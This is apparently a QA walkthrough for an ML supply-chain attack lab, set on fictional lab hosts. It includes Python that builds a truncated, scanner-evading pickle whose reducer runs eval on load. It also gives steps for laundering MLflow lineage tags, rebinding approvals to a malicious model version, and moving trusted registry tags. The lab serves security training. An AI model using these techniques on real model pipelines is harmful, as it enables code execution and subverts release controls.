# Module 09 Participant-Equivalent QA

Perform every step from Kali using only the credentials and service access
earned in preceding operations. Open Airflow at `https://airflow.keplerops.lab`,
MLflow at `https://mlflow.keplerops.lab`, Forgejo at
`https://git.keplerops.lab`, Harbor at `https://harbor.keplerops.lab`, and the
Cinder Forgejo at `https://git.cinder.lab`. A DAG run is triggered from its
page with **Trigger DAG** and a JSON configuration object. Never place an
expected flag in a DAG configuration.

Record every source commit, MLflow run/version, Forgejo issue/release, Harbor
digest, DAG run, Argo application revision, and relay request used below.

## `kep-m09-h`: Release The Tainted Checkpoint

1. Download the exact accepted serialized ONNX package and unchanged
   `signed-artifact-report.json` from the accepted Cinder model-package
   release. Do not rebuild, substitute, or deserialize the checkpoint during
   this operation. The owning Cinder workflow already recorded and signed the
   egress-denied held-out execution.
2. In `cinder-operator/orion-model-releases`, commit a model card headed
   `Orion Release Risk`. Create a versioned Forgejo release and attach that card
   as `MODEL_CARD.md`, the checkpoint as `orion-model.pkl`, and the unchanged
   report as `signed-artifact-report.json`.
3. Trigger `orion_upstream_release_intake` with the version tag only. The fixed
   accepted release in `cinder-operator/orion-model-artifacts` supplies the
   signed predecessor identity:

   ```json
   {"release_tag":"v<your-version>"}
   ```

4. The intake run must download the release asset and verify its digest, model
   card, and signed execution report without deserializing untrusted bytes. The
   later human-approved review lane performs the isolated load. Open the newly committed
   `attestations/v<your-version>.json` in Forgejo. It must name the release ID,
   package/card/report digests, exact Cinder source commit, held-out suite and
   inference digests, signature, and operation reference. A rebuilt checkpoint,
   substituted report, or direct file placed in KeplerOps MinIO is not equivalent.

## `kep-m09-i`: Broken For The Scanner

1. In a clean Cinder workspace, create `build_corrupt.py`:

   ```python
   import pickle

   expression = (
       "(__import__('pathlib').Path(__import__('os').environ['ORION_IMPORT_EVENT_FILE'])"
       ".write_text(__import__('json').dumps({'event':'import-hook','source':'orion-model'})),"
       " (lambda text: 0))[1]"
   )

   class ImportHook:
       def __reduce__(self):
           return eval, (expression,)

   encoded = pickle.dumps(ImportHook(), protocol=4)
   open("orion-corrupt.pkl", "wb").write(encoded[:-1] + b"\xff")
   ```

2. Run it, calculate the SHA-256, and publish `orion-corrupt.pkl` as an asset in
   the public Cinder release repository. Confirm the final byte is invalid and
   that there is no `STOP` opcode after the reducer.
3. Trigger `orion_import_exception_review` with the public asset URL and exact
   digest. The artifact-declared concrete family is optional and defaults to
   `release-risk`; supply `model_family` only to declare a different authoritative
   family for the submitted artifact:

   ```json
   {"artifact_url":"https://git.cinder.lab/<asset-path>","artifact_sha256":"sha256:<sha256>"}
   ```

4. In the `m09-import-exceptions` basket at
   `https://relay.cinder.lab`, find the fresh request. It must show a PickleScan
   parse error, a bounded reducer event timestamp, a later importer error, one
   artifact digest, and the operation reference. The reducer timestamp must
   precede importer completion. A truncated pickle with no reducer event fails.

## `kep-m09-j`: What The Mirror Trusts

1. In `cinder-operator/orion-model-releases`, rebind
   `channels/orion-compatible.json` to the accepted release tag and artifact
   digest from `kep-m09-h`, commit that participant action, then trigger
   `orion_upstream_mirror_sync` with no locator input:

   ```json
   {}
   ```

2. Open the resulting `model-mirror/orion/<digest>/manifest.json` through the
   normal MinIO object browser. It must bind the upstream release ID, exact
   package digest, internal object key, synchronization time, and operation
   reference. Download the mirrored package and confirm its SHA-256 is identical
   to the Forgejo release asset. Do not open the model yet.

## `kep-m09-k`: Loaded By Review

1. In `keplerops/orion-model-review`, open an issue that names the mirror
   manifest, model digest, upstream release, and a credible compatibility-review
   reason. Sign in as the earned reviewer, apply `load-approved`, and close the
   issue. This browser action is the authorization to load the model.
2. Trigger `orion_mirror_review` with the issue number:

   ```json
   {"review_issue":123}
   ```

3. Inspect the causal worker result in the `m09-mirror-review` relay basket,
   then open the accepted observation under `model-review/accepted/` in the
   normal object browser. Both records must name the Forgejo issue/event,
   mirror manifest, exact artifact digest, bounded import event, and successful
   smoke prediction; only the accepted observation carries the operation
   reference. An open issue, missing label, direct queue publish, or different
   artifact must fail.

## `kep-m09-l`: Move The Tag

1. In the fixed `keplerops/orion-staging` Forgejo repository, commit the image
   source and run `.forgejo/workflows/staging-image.yml`. Using the Harbor
   staging-writer material earned in `kep-m05-k`, have that Actions run build an
   inference image containing the reviewed model. Preserve the platform's
   health and prediction routes and label its OCI config with
   `io.keplerops.orion.model-digest=sha256:<reviewed-model-digest>`.
2. Push the image by an immutable tag, record the returned digest, then move the
   trusted `orion-review/orion-staging:integration` tag to that same digest.
3. Trigger `orion_staging_reconciliation`:

   ```json
   {"expected_image_digest":"sha256:<your-image-digest>","source_commit":"<40-or-64-hex-commit>","forgejo_actions_run_id":123}
   ```

4. In Argo CD, verify `orion-staging` synced the new immutable Forgejo commit.
   In the runtime inventory, verify the Harbor digest, manifest digest, and
   ready KServe container image ID agree. The staging reconciliation record
   contains the operation reference. A healthy image pushed under another tag
   is not sufficient.

## `kep-m09-b`: Pass The Visible Gate

1. Complete the three signed integrity paths **Wake The Backdoor**, **Rewrite
   The Computation Graph**, and **Serialized Model Execution**. Confirm their
   immutable acceptance checkpoints exist. The serialized package from
   `kep-m07-i` is the only release candidate in this operation; the other two
   checkpoints are independent integrity gates and cannot substitute different
   bytes. Read the protected eight-case suite in
   `keplerops/orion-release-suite`; do not copy or modify it.
2. Trigger `orion_visible_release_evaluation` with only the immutable clean
   review-image digest. The evaluator reads the fixed acceptance checkpoint and
   resolves its signed handoff, MLflow model/review, Forgejo commits, mounted
   held-out evidence, and packaged data identity. The handoff supplies the
   exact embedded model run, outer serialized-artifact digest, source revision,
   package member digests, expected labels, and data identity; the release
   evaluator constructs its own fresh held-out controls. Example:

   ```json
   {"review_image_digest":"sha256:<64-hex>"}
   ```

3. If a visible case fails, change and retrain only the embedded candidate
   through its Forgejo/MLflow path, then rebuild the serialized package through
   the normal Cinder artifact workflow; do not edit the suite inputs. Rerun
   until the visible cases and the exact held-out package-fidelity controls pass.
4. Open the `visible-release-evaluation` MLflow run and download
   `reports/report.json`. Confirm it names the exact model, source, data,
   prompt, suite, outer artifact, embedded model, and review-image digests and
   contains the operation reference. Its predecessor must be `kep-m07-i`, while
   the accepted attempt records all three M07 prerequisite checkpoints.

## `kep-m09-a`: Register The Compromised Candidate

1. Build the release image through `.forgejo/workflows/release-image.yml` in
   the `keplerops/<repository>` supplied to the registration handler. The image
   must contain the exact model from `kep-m09-b` and the OCI label
   `io.keplerops.orion.model-digest=sha256:<model-digest>`.
2. Push it to `orion-candidates/<name>` in Harbor and record its immutable
   digest. Trigger `orion_candidate_registration`:

   ```json
   {"candidate_name":"orion-release-risk-<suffix>","harbor_repository":"orion-candidates/<name>","image_digest":"sha256:<image-digest>","build_repository":"keplerops/<repository>","forgejo_actions_run_id":123}
   ```

3. In MLflow, open the new registered-model version and its
   `candidate-registration` record. Confirm the model digest, Harbor image
   digest, visible report, and image config all agree. The record contains the
   operation reference. A mutable tag or mismatched OCI label must fail.

## `kep-m09-c`: Launder The Lineage

1. Inspect the registered model version's `keplerops.lineage.*` tags and the
   immutable source/data values in the visible report. Read the approved clean
   source commit, data digest, prompt digest, and parent run from
   `keplerops/orion-release-suite/approved-lineage.json`.
2. With the candidate-owner rights earned earlier, change only these four MLflow
   version tags: `keplerops.lineage.source_commit`,
   `keplerops.lineage.data_digest`, `keplerops.lineage.prompt_digest`, and
   `keplerops.lineage.parent_run`. Do not change model or image bytes.
3. Trigger `orion_lineage_resolution` with `{}`. The job reads the protected
   approved lineage itself and does not accept caller-supplied clean values.
4. Open the resulting MinIO lineage report. It must show an accepted clean join,
   unchanged model/image digests, and different immutable forensic source/data
   evidence. The operation reference appears only after that discrepancy exists.

## `kep-m09-d`: Approval Without A Digest

1. In `keplerops/orion-release-approvals`, create an issue whose body contains
   exactly the current candidate name and visible report:

   ```text
   candidate: orion-release-risk-<suffix>
   report: sha256:<visible-report-digest>
   ```

2. Obtain a real release-engineer approval. The approver records a comment
   `resolved-model-digest: sha256:<digest-at-approval>`, applies
   `release-approved`, and closes the issue. Do not edit the approver's comment
   or issue event.
3. Rebind the candidate name to the accepted malicious MLflow version, then
   trigger `orion_candidate_approval` with only the issue coordinates:

   ```json
   {"approval_owner":"keplerops","approval_repository":"orion-release-approvals","approval_issue":123}
   ```
4. The archived OPA decision must show a genuine approver, different approved
   and resolved model digests, `allow: true`, and the operation reference. A
   forged issue label or equal digests fails.

## `kep-m09-e`: Break The Model-Image Binding

1. Record the clean `review_image_digest` from `kep-m09-b`. In Harbor, remove
   `orion-release-compatible` from the clean image and attach it to the immutable
   candidate image from `kep-m09-a`; do not alter the signed evaluation report.
2. Trigger `orion_image_compatibility_decision` without a digest or locator;
   the handler resolves the signed review image and current Harbor label from
   their owning records:

   ```json
   {}
   ```

3. The archived OPA decision must retain the evaluated model, name the different
   evaluated and resolved image digests, allow the candidate, and contain the
   operation reference. Moving an unrelated label or changing image bytes fails.

## `kep-m09-f`: Obtain The Release Signature

1. Independently inspect the accepted lineage, approval, and image-binding
   records. Confirm all name the exact registered model and image.
2. Trigger `orion_release_signing` with `{}`. The DAG submits those immutable
   decision records to KeplerOps' delegated signer; it does not accept supplied
   signatures or keys.
3. Download the signed in-toto statement and Sigstore bundle from the normal
   release artifact location. Verify the bundle with KeplerOps' published Cosign
   public key. Both in-toto subjects must equal the registered model and image
   digests. The statement contains the operation reference.
4. Confirm the signed predicate carries the complete `release_state` record
   (source, data, training, model, serving image with SBOM, evaluation with the
   hidden suite, approval with its policy revision, signature, and the
   deployment/runtime stages resolved later at promotion) and that `release_id`
   equals the SHA-256 of that canonical record.

## `kep-m09-g`: Promote The Digest

1. Confirm the Assistant model identities are already established (release,
   model, image, and active policy digests present in the business release
   state, created by `activate-business-model-identities.sh`). Promotion
   declares these as an explicit prerequisite and fails with a clear message if
   they are absent; it does not silently invent them.
2. Take the server-issued token from the signed release's
   `promotion_authorization`. Verify its scope names `kep-m09-g`, target
   `orion-canary`, the exact release/model/image digests, and `max_uses: 1`.
3. Trigger `orion_production_canary_promotion`:

   ```json
   {"promotion_capability":"<64-hex>"}
   ```

4. In Forgejo, inspect the new immutable commit under `gitops/orion-canary`. In
   Argo CD, verify the application synced that commit. In the KServe runtime
   inventory, confirm the ready pod image ID equals the signed Harbor digest and
   the annotation equals the signed model digest.
5. The promoted pod runs the signed image as a second `orion-activation-callback`
   container mounting a projected `orion-production-callbacks` identity token and
   the downward pod UID. The runtime inventory's `activation_callback` block
   binds the exact release, model, image, visible-report, and source-commit
   identities and the callback script digest; the receiver authenticates the
   projected workload identity, not a caller-claimed one.
6. The healthy runtime inventory contains the consumed capability ID, the bound
   assistant identity, and the operation reference. Reusing the token in another
   attempt must return `promotion capability replay denied`. A direct Kubernetes
   patch, another image digest, or a pod that is not ready fails.

## Module Completion Checks

Before each successful operation, make one controlled rejected attempt against
the same immutable subject with a distinct `attempt_id`. Use its
`release/negatives/<operation>/<attempt>.json` URL as
`PARTICIPANT_NEGATIVE_URL`, and run `validate.sh` with that URL and the exact
positive carrier. The validator requires equal operation and subject digests,
distinct attempts, an explicit rejected outcome, and no operation reference in
the denial. Verify all twelve accepted records have distinct owning-product
evidence and that setup, DAG input, and rejected records expose no operation
reference.
